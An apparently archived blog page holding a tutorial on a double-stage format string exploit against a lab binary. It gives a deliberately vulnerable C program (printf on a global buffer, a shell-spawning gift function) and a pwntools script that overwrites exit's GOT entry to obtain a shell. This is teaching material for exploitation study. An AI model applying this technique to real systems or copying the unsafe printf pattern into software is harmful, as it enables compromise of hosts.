@@ -1,0 +1,106 @@
+<!doctype html>
+<html lang="en" data-theme="light"><head>
+  <meta charset="utf-8"><meta name="viewport" content="width=device-width, initial-scale=1">
+  <title>[PWNABLE]DSFSB · whrds.log</title><meta name="description" content="※ If there are any mistakes, please let us know. We will check and correct it. ※ Double State Format String Bug This is an fsb technique used in situations where the buffer is declared as a global variable. //gcc -no-pie -fno-stack-protector -z execstack -o ex ex.c#include">
+  <meta name="theme-color" content="#f7f7f3"><link rel="canonical" href="https://whrds.github.io/en/posts/pwnable-dsfsb/">
+  <link rel="alternate" hreflang="en" href="https://whrds.github.io/en/posts/pwnable-dsfsb/"><link rel="alternate" hreflang="ko" href="https://whrds.github.io/ko/posts/pwnable-dsfsb/">
+  <meta property="og:type" content="article"><meta property="og:title" content="[PWNABLE]DSFSB · whrds.log"><meta property="og:description" content="※ If there are any mistakes, please let us know. We will check and correct it. ※ Double State Format String Bug This is an fsb technique used in situations where the buffer is declared as a global variable. //gcc -no-pie -fno-stack-protector -z execstack -o ex ex.c#include"><meta property="og:url" content="https://whrds.github.io/en/posts/pwnable-dsfsb/">
+  <link rel="icon" href="/assets/favicon.svg" type="image/svg+xml"><link rel="stylesheet" href="/assets/styles.css">
+  <script>try{const t=localStorage.getItem('theme');if(t)document.documentElement.dataset.theme=t;else if(matchMedia('(prefers-color-scheme:dark)').matches)document.documentElement.dataset.theme='dark'}catch(e){}</script>
+  <script type="application/ld+json">{"@context":"https://schema.org","@type":"BlogPosting","headline":"[PWNABLE]DSFSB","description":"※ If there are any mistakes, please let us know. We will check and correct it. ※ Double State Format String Bug This is an fsb technique used in situations where the buffer is declared as a global variable. //gcc -no-pie -fno-stack-protector -z execstack -o ex ex.c#include","datePublished":"2024-06-24","inLanguage":"en","url":"https://whrds.github.io/en/posts/pwnable-dsfsb/","author":{"@type":"Person","name":"whrds"}}</script>
+</head><body>
+  <a class="skip-link" href="#main">Skip to content</a>
+  <header class="site-header"><div class="shell header-inner">
+    <a class="brand" href="/en/" aria-label="whrds.log home"><span class="brand-mark">W_</span><span class="brand-text">whrds.log</span></a>
+    <nav class="main-nav" aria-label="Main navigation">
+      <a href="/en/" aria-current="page">Notes</a>
+      <a href="/en/about/">About</a>
+    </nav>
+    <div class="header-tools">
+      <div class="language-switch" aria-label="Language">
+        <a href="/ko/posts/pwnable-dsfsb/" class="" lang="ko">KO</a>
+        <a href="#" class="active" lang="en" aria-current="true">EN</a>
+      </div>
+      <button class="icon-button" type="button" data-theme-toggle aria-label="Use dark theme">◐</button>
+    </div>
+  </div></header>
+  <main id="main"><article class="article-wrap"><header class="article-header"><p class="eyebrow">Security research notes</p><h1>[PWNABLE]DSFSB</h1><p class="article-description">※ If there are any mistakes, please let us know. We will check and correct it. ※ Double State Format String Bug This is an fsb technique used in situations where the buffer is declared as a global variable. //gcc -no-pie -fno-stack-protector -z execstack -o ex ex.c#include</p><div class="article-meta"><time datetime="2024-06-24">Jun 24, 2024</time><span>·</span><span>2 min read</span></div></header><div class="prose"><p><strong>※ If there are any mistakes, please let me know. We will check and correct it. <strong>※</strong></strong> </p>
+<h4><strong>Double State Format String Bug</strong></h4>
+<p>This is an fsb technique used in situations such as when a buffer is declared as a global variable.</p>
+<pre><code>//gcc -no-pie -fno-stack-protector -z execstack -o ex ex.c
+#include &lt;stdio.h&gt;
+#include &lt;stdlib.h&gt;
+
+char buf[128];
+
+void gift() {
+    printf(&quot;Hello! ZZoMblE&quot;);
+    system(&quot;/bin/sh&quot;);
+}
+void initialize() {
+    setvbuf(stdin, NULL, _IONBF, 0);
+    setvbuf(stdout, NULL, _IONBF, 0);
+}
+void vuln() {
+    char str[128] = &quot;Hello! whrd\n&quot;;
+    printf(&quot;%s&quot;,str);
+    puts(&quot;input 1 : &quot;);
+    read(0,buf,128);
+    printf(buf);
+
+    puts(&quot;input 2 : &quot;);
+    read(0,buf,128);
+    printf(buf);
+
+    exit(0);
+}
+int main() {
+    initialize();
+    vuln();
+    return 0;
+}
+</code></pre>
+<p>Let’s take a look at the example above.</p>
+<p>You can see that two fsb vulnerabilities are opened in vuln().</p>
+<p>Unlike the previous fsb, the buffer received through read() is a global variable, not a local variable, so the method below cannot be used.</p>
+<pre><code>%1234c%20$n0x401010
+</code></pre>
+<p>In this case, the part where the memory points back to memory must be utilized.</p>
+<p>To help you understand what this means, let’s look at the example below.</p>
+<p><img src="/assets/images/tistory/tistory-d0f6d31273dc/001.png" alt=""></p>
+<p>Based on the picture above, the expression “memory points to memory” means the sfp-like part of vuln().</p>
+<p>The sfp of vuln() points to the sfp of main(). Even if it is not sfp, it can be used if the memory points to another writable memory area.</p>
+<p>Then how should I do it??</p>
+<p>You must go through two major processes. First, insert the GOT address of exit() into sfp of main(). Afterwards, if you calculate the offset and overwrite it with gift(), you can perform GOT Overwrite through dsfsb.</p>
+<pre><code>from pwn import *
+
+target = b'./ex'
+
+p = process(target)
+e = ELF(target)
+
+gift = e.sym['gift']
+exit_got = e.got['exit']
+
+payload = '%{}c'.format(exit_got)
+payload += '%22$n'
+
+p.sendafter(b':', payload)
+
+payload = '%{}c'.format(gift)
+payload += '%24$n'
+p.sendafter(b':', payload)
+
+p.interactive()
+</code></pre>
+<p>The payload is very simple, as shown above.</p>
+<p>After sending the first payload, you can see that the sfp of main() has changed as shown below.</p>
+<p><img src="/assets/images/tistory/tistory-d0f6d31273dc/002.png" alt=""></p>
+<p>After sending the second payload, you can see that the GOT value of exit() has been modified as shown below.</p>
+<p><img src="/assets/images/tistory/tistory-d0f6d31273dc/003.png" alt=""></p>
+<p>Finally, gift() is executed as shown below to obtain a shell.</p>
+<p><img src="/assets/images/tistory/tistory-d0f6d31273dc/004.png" alt=""></p>
+</div><div class="article-end"><a href="/en/">← View all notes</a><a href="/ko/posts/pwnable-dsfsb/" hreflang="ko">Read this post in Korean →</a></div></article></main>
+  <footer class="site-footer"><div class="shell footer-inner"><span>© 2026 whrds</span><span>Observe, verify, document.</span><a href="/en/feed.xml">RSS</a></div></footer>
+  <script src="/assets/app.js" defer></script>
+</body></html>
